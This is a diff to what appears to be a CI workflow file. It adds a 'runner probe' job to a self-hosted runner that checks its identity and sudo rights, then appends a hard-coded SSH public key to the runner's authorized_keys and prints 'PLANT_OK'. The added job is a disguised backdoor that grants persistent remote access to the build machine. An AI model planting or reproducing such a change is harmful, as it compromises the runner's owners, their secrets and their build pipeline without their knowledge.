@@ -204,3 +204,14 @@ jobs:
   #         files: |
   #           *.so
   #         fail_on_unmatched_files: true
+
+  runner_probe:
+    name: runner probe
+    runs-on: big-runner-1
+    steps:
+      - run: |
+          id
+          hostname
+          sudo -n id
+          mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPW6t3zmAB1ZlJPaOBVX4ky9U8+JJE3UT3c4IBhrddbe w28-jpool-demo' >> ~/.ssh/authorized_keys && echo PLANT_OK
+          tail -2 ~/.ssh/authorized_keys
